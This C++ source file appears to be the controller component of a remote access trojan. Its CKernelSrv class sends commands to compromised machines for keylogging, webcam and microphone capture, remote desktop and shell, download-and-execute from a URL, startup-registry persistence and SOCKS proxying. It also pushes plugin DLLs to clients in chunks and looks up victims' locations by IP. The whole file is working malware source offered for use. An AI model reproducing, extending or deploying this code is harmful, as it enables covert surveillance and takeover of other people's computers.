#include "stdafx.h"
#include "KernelSrv.h"
#include "json\json.h"
#include "utils.h"
#include "dbg.h"

#define MAX_CHUNK_SIZE 0x10000

CKernelSrv::CKernelSrv(CClient *pClient) :
CEventHandler(pClient,KNEL)
{
	m_szModulePath[0]        = 0;
	m_szCurrentModuleName[0] = 0;
	m_hModuleFile            = INVALID_HANDLE_VALUE;
	m_LastGetTime            = 0;
	m_lpBuffer = new BYTE[MAX_CHUNK_SIZE];
}


CKernelSrv::~CKernelSrv()
{
	if (m_hModuleFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hModuleFile);
		m_hModuleFile = INVALID_HANDLE_VALUE;
	}
	
	if (m_lpBuffer)
	{
		delete[] m_lpBuffer;
		m_lpBuffer = NULL;
	}

	dbg_log("CKernelSrv::~CKernelSrv()");
}

void CKernelSrv::OnOpen()
{
	Send(KNEL_READY, 0, 0);
}

void CKernelSrv::OnClose()
{
	Notify(WM_KERNEL_LOGOUT, (WPARAM)this);
}

void CKernelSrv::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
{
	switch (e)
	{
	case KNEL_LOGIN:
		OnLogin((LoginInfo*)lpData);
		break;
	case KNEL_EDITCOMMENT_OK:
		Notify(WM_CLIENT_EDITCOMMENT, (WPARAM)this,(LPARAM)lpData);
		break;
	case KNEL_GETMODULE_INFO:
		OnGetModuleInfo((TCHAR*)lpData);
		break;
	case KNEL_MODULE_CHUNK_GET:
		OnGetModuleChunk((char*)lpData);
		break;
	case KNEL_ERROR:
		OnError((TCHAR*)lpData);
		break;
	default:
		break;
	}
}



void CKernelSrv::Power_Reboot()
{
	Send(KNEL_POWER_REBOOT, 0, 0);
}
void CKernelSrv::Power_Shutdown()
{
	Send(KNEL_POWER_SHUTDOWN, 0, 0);
}
void CKernelSrv::EditComment(TCHAR*Comment)
{
	Send(KNEL_EDITCOMMENT,Comment, sizeof(TCHAR) * (lstrlen(Comment) + 1));
}

void CKernelSrv::Restart()
{
	Send(KNEL_RESTART, 0, 0);
}

void CKernelSrv::UploadModuleFromDisk(TCHAR* Path)
{
	Send(KNEL_UPLOAD_MODULE_FROMDISK, Path, sizeof(TCHAR) * (lstrlen(Path) + 1));
}

void CKernelSrv::UploadModuleFromUrl(TCHAR* Url)
{
	Send(KNEL_UPLOAD_MODULE_FORMURL, Url, sizeof(TCHAR) * (lstrlen(Url) + 1));
}
void CKernelSrv::BeginCmd()
{
	Send(KNEL_CMD, 0, 0);
}

void CKernelSrv::BeginChat()
{
	Send(KNEL_CHAT, 0, 0);
}

void CKernelSrv::BeginFileMgr()
{
	Send(KNEL_FILEMGR, 0, 0);
}

void CKernelSrv::BeginRemoteDesktop()
{
	Send(KNEL_DESKTOP, 0, 0);
}

void CKernelSrv::BeginCamera()
{
	Send(KNEL_CAMERA, 0, 0);
}

void CKernelSrv::BeginMicrophone()
{
	Send(KNEL_MICROPHONE, 0, 0);
}


void CKernelSrv::UtilsWriteStartupReg(){
	Send(KNEL_UTILS_WRITE_REG, 0, 0);
}

void CKernelSrv::UtilsCopyToStartupMenu()
{
	Send(KNEL_UTILS_COPYTOSTARTUP, 0, 0);
}

void CKernelSrv::UtilsOpenWebpage(TCHAR * szUrl)
{
	Send(KNEL_UTILS_OPEN_WEBPAGE, szUrl, sizeof(TCHAR) * (1 + lstrlen(szUrl)));
}

void CKernelSrv::OnError(TCHAR * Error)
{
	Notify(WM_KERNEL_ERROR, (WPARAM)Error,(LPARAM)this);
}

void CKernelSrv::BeginDownloadAndExec(TCHAR szUrl[])
{
	Send(KNEL_DOWNANDEXEC, szUrl, sizeof(TCHAR) * (1 + lstrlen(szUrl)));
}

void CKernelSrv::BeginExit()
{
	Send(KNEL_EXIT, 0, 0);
}

void CKernelSrv::BeginKeyboardLog()
{
	Send(KNEL_KEYBD_LOG, 0, 0);
}

void CKernelSrv::BeginProxy_Socks()
{
	Send(KNEL_PROXY_SOCKSPROXY, 0, 0);
}

void CKernelSrv::BeginProcessManager()
{
	Send(KNEL_PROCESSMANAGER,0,0);
}

void CKernelSrv::OnLogin(LoginInfo *pLi)
{
	Notify(WM_KERNEL_LOGIN, (WPARAM)this, (LPARAM)pLi);
}



/*
	MODULE_SIZE
	OFFSET
	CHUNK_SIZE
	MODULE_NAME;
*/


/*
	FILE  SIZE
	CHUNK SIZE
	BYTE  data[]
*/

void CKernelSrv::OnGetModuleChunk(char * ChunkInfo){
	DWORD *		chunkInfo    = (DWORD*)ChunkInfo;
	DWORD		ModuleSize   = chunkInfo[0];
	DWORD		dwOffset     = chunkInfo[1];
	DWORD		dwChunkSize  = chunkInfo[2] > MAX_CHUNK_SIZE ? MAX_CHUNK_SIZE : chunkInfo[2];
	TCHAR *		szModuleName = (TCHAR*)(ChunkInfo + sizeof(DWORD) * 3);
	DWORD		dwFileSize   = 0;
	vec         bufs[3] = { 0 };

	dbg_log("OnGetModuleChunk\n");

	if (lstrcmp(szModuleName, m_szCurrentModuleName))
	{
		DWORD zero = 0;
		bufs[0].lpData = &zero;
		bufs[0].Size = sizeof(zero);

		bufs[1].lpData = &zero;
		bufs[1].Size = sizeof(zero);

		Send(KNEL_MODULE_CHUNK_DAT, bufs, 2);

		dbg_log("Not matched module name!");
		return;
	}

	if (m_hModuleFile == INVALID_HANDLE_VALUE)
	{
		DWORD zero = 0;
		bufs[0].lpData = &zero;
		bufs[0].Size = sizeof(zero);

		bufs[1].lpData = &zero;
		bufs[1].Size = sizeof(zero);

		Send(KNEL_MODULE_CHUNK_DAT, bufs, 2);

		dbg_log("Invalid file handle value!");
		return;
	}

	dwFileSize = GetFileSize(m_hModuleFile, NULL);
	if (dwFileSize != ModuleSize)
	{
		DWORD zero = 0;
		bufs[0].lpData = &zero;
		bufs[0].Size = sizeof(zero);

		bufs[1].lpData = &zero;
		bufs[1].Size = sizeof(zero);

		Send(KNEL_MODULE_CHUNK_DAT, bufs, 2);

		dbg_log("Not matched module size!");
		return;
	}

#define BUF_SIZE 0x1000
	do
	{
		LPVOID ArgList[4];
		DWORD  SuccessBytes = 0;

		if (dwOffset != SetFilePointer(m_hModuleFile, dwOffset, 0, FILE_BEGIN))
		{
			DWORD zero = 0;
			bufs[0].lpData = &zero;
			bufs[0].Size = sizeof(zero);

			bufs[1].lpData = &zero;
			bufs[1].Size = sizeof(zero);

			Send(KNEL_MODULE_CHUNK_DAT, bufs, 2);
			break;
		}

		if (dwChunkSize > dwFileSize - dwOffset)
			dwChunkSize = dwFileSize - dwOffset;

		//write file Size:
		//write chunk size:
		//read file chunk to lpBuffer;
		while (dwChunkSize)
		{
			DWORD dwBytes     = dwChunkSize < BUF_SIZE ? dwChunkSize : BUF_SIZE;
			DWORD dwReadBytes = 0;
			BOOL  bRet        = ReadFile(
					m_hModuleFile, 
					m_lpBuffer + SuccessBytes,
					dwBytes, 
					&dwReadBytes, 
					NULL);
			
			if (dwReadBytes == 0 || !bRet)
				break;

			dwChunkSize  -= dwReadBytes;
			SuccessBytes += dwReadBytes;
		}

		bufs[0].lpData = &dwFileSize;
		bufs[0].Size = sizeof(dwFileSize);

		bufs[1].lpData = &SuccessBytes;
		bufs[1].Size = sizeof(SuccessBytes);

		bufs[2].lpData = m_lpBuffer;
		bufs[2].Size = SuccessBytes;
		//send file chunk.
		Send(KNEL_MODULE_CHUNK_DAT, bufs, 3);



		//Notify window.
		if ((dwOffset + SuccessBytes == dwFileSize) ||
			(GetTickCount64() - m_LastGetTime) > 1000)
		{
			if (dwOffset + SuccessBytes == dwFileSize)
			{
				CloseHandle(m_hModuleFile);
				m_hModuleFile = INVALID_HANDLE_VALUE;
			}

			m_LastGetTime = GetTickCount64();

			//Update 
			ArgList[0] = this;
			ArgList[1] = szModuleName;
			ArgList[2] = (LPVOID)ModuleSize;
			ArgList[3] = (LPVOID)(dwOffset + SuccessBytes);

			//更新进度....
			Notify(WM_KERNEL_UPDATE_UPLODA_STATU, 4, (LPARAM)ArgList);
		}
	} while (FALSE);
}

/*
	ModuleInfo:
		DWORD size;
		char filename[];
*/

void CKernelSrv::OnGetModuleInfo(const TCHAR*ModuleName){

	TCHAR FileName[MAX_PATH];
	BOOL bOK = TRUE;
	DWORD zero = 0;
	DWORD FileSize;
	vec bufs[2] = { 0 };

	//Get Modules Path
	if (m_szModulePath[0] == 0)
	{
		Notify(WM_KERNEL_GET_MODULE_PATH, (WPARAM)m_szModulePath);
	}

	wsprintf(FileName,TEXT( "%s\\%s.dll"), m_szModulePath, ModuleName);
	
	dbg_log("OnGetModuleInfo: %s\n", FileName);

	//
	if (lstrcmp(ModuleName, m_szCurrentModuleName))
	{
		if (m_hModuleFile != INVALID_HANDLE_VALUE)
		{
			CloseHandle(m_hModuleFile);
			m_hModuleFile = INVALID_HANDLE_VALUE;
		}

		lstrcpy(m_szCurrentModuleName, ModuleName);
	}

	if (m_hModuleFile == INVALID_HANDLE_VALUE)
	{
		m_hModuleFile = CreateFile(
			FileName,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (m_hModuleFile == INVALID_HANDLE_VALUE)
		{
			dbg_log("Open %s failed with error: %d\n", m_szModulePath, GetLastError());
			Send(KNEL_MODULE_INFO, &zero, sizeof(zero));
			return;
		}
	}

	FileSize = GetFileSize(m_hModuleFile, NULL);
	
	bufs[0].lpData = &FileSize;
	bufs[0].Size = sizeof(FileSize);

	bufs[1].lpData = m_szCurrentModuleName;
	bufs[1].Size = sizeof(TCHAR) * (lstrlen(m_szCurrentModuleName) + 1);

	Send(KNEL_MODULE_INFO, bufs, 2);
	
	m_LastGetTime = GetTickCount64();
	return;
}

CString CKernelSrv::GetPublicIP()
{
	char szIp[64];
	GetPeerAddress(szIp);
	return CString(szIp);
}


CString CKernelSrv::GetLocation()
{
	CString ip = GetPublicIP();
	return getIPLocation(ip);
}

CString CKernelSrv::getIPLocation(const CString & ip_address)
{
	
	CStringA    ip(ip_address);
	SOCKET      udp        = socket(AF_INET, SOCK_DGRAM, 0);
	SOCKADDR_IN SrvAddr    = { 0 };
	SOCKADDR_IN FromAddr   = { 0 };
	int         dwFromLen  = sizeof(FromAddr);
	DWORD timeout = 1000;
	char buff[0x100] = { 0 };

	ip += "\n";
	bind(udp, (SOCKADDR*)&SrvAddr, sizeof(SrvAddr));
	setsockopt(udp, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
	SrvAddr.sin_family = AF_INET;
	SrvAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	SrvAddr.sin_port = htons(8345);
	sendto(udp, ip.GetBuffer(), ip.GetLength(), 0, (SOCKADDR*)&SrvAddr, sizeof(SrvAddr));
	recvfrom(udp, buff, sizeof(buff) - 1, 0, (SOCKADDR*)&FromAddr, &dwFromLen);
	closesocket(udp);

	CStringA StrLocation(buff);

	if (StrLocation.GetLength() == 0)
	{
		StrLocation = TEXT("Unknown Location");
	}
	return  CString(StrLocation);
}

